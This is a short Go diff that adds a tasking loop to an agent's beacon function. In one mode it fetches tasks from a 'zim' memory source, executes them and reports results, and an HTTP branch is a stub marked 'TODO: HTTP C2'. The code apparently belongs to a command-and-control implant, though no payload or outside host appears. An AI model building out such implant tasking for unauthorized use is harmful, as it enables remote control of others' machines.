@@ -43,8 +43,16 @@ func (a *Agent) Run() {
 }
 
 func (a *Agent) beacon() {
-	fmt.Printf("[*] Beacon from %s\n", a.ID)
-	// TODO: Check for commands
+	switch a.Mode {
+	case "zim":
+		tasks := a.checkZimMemory()
+		for _, task := range tasks {
+			result := a.executeTask(task)
+			a.reportResult(task.ID, result)
+		}
+	case "http":
+		// TODO: HTTP C2
+	}
 }
 
 func main() {
